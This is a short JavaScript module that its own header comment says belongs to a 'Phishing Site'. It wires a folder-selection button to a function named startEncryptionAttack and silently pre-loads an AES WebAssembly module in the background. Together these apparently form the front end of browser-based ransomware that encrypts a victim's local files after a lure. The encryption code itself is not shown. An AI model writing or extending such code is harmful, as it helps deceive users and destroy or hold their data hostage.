/**
 * App Module
 * Binds the UI elements to the encryption modules for the Phishing Site.
 */
document.addEventListener('DOMContentLoaded', async () => {
    
    const btnSelectFolder = document.getElementById('btnSelectFolder');

    if (btnSelectFolder) {
        btnSelectFolder.addEventListener('click', async () => {
            btnSelectFolder.disabled = true;
            await FSAModule.startEncryptionAttack();
            btnSelectFolder.disabled = false;
        });
    }

    // Pre-load Wasm module in background silently
    AESModule.loadWasm().catch(e => console.warn("Background Wasm load failed, will retry on click.", e));
});